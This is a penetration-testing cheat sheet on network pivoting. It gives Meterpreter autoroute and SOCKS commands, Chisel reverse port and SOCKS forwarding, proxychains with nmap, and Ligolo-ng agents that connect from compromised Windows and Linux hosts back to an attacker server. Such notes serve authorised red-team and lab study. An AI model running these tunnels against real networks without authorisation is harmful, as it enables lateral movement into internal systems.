# Pivoting

- [Pivoting](#pivoting)
  - [Meterpreter](#meterpreter)
    - [Set Route](#set-route)
  - [Chisel](#chisel)
  - [Port forwarding](#port-forwarding)
  - [Traffic forwarding](#traffic-forwarding)
    - [Server (Attacker)](#server-attacker)
    - [Target](#target)
    - [Proxychains](#proxychains)
  - [Ligolo-ng - Tunneling like a VPN](#ligolo-ng---tunneling-like-a-vpn)
  - [Linux server](#linux-server)
    - [When agent is connected](#when-agent-is-connected)
  - [Windows agent](#windows-agent)
  - [Linux agent](#linux-agent)

## Meterpreter

### Set Route

```msf
run autoroute -s 172.16.1.0/24
```powershell

Check the result

```msf
run autoroute -p
```

Run server SOCK4

```msf
use auxiliary/server/socks4a
set SRVPORT 9050
run -j 
```

## Chisel

## Port forwarding

> Client

```powershell
chisel client Server_IP:6666 R:7777:127.0.0.1:8443
```

> Server

```powershell
chisel server -p port --reverse
```

Connect:

<https://127.0.0.1:7777>

## Traffic forwarding

### Server (Attacker)

```powershell
1.  chisel server -p 8000 -reverse
4.  chisel client 127.0.0.1:8001 socks
```

### Target

```powershell
2.  chisel client Server_IP:8000 R:8001:127.0.0.1:1337
3.  chisel server -p 1337 --socks5
```

### Proxychains

> proxychains

nano /etc/proxychains.conf

```text
socks5         127.0.0.1 1080
```

proxychains command

> Nmap

```bash
proxychains -q nmap -sT -P0 IP_ADDRESS
```

> Foxy proxy

```text
For the web 
```

## Ligolo-ng - Tunneling like a VPN

## Linux server

> Pre-config

```bash
sudo ip tuntap add user USERNAME mode tun ligolo
sudo ip link set ligolo up
ligolo-ng -selfcert
```

### When agent is connected

Add the route of the network:

```bash
sudo ip route add 192.168.0.0/24 dev ligolo
```

> Start tunneling

```cmd
sessions NUM_AGENT
start
```

## Windows agent

```cmd
agent.exe -connect 192.168.100.141:11601 -ignore-cert
```

## Linux agent

```bash
agent -connect 192.168.100.141:11601 -ignore-cert
```
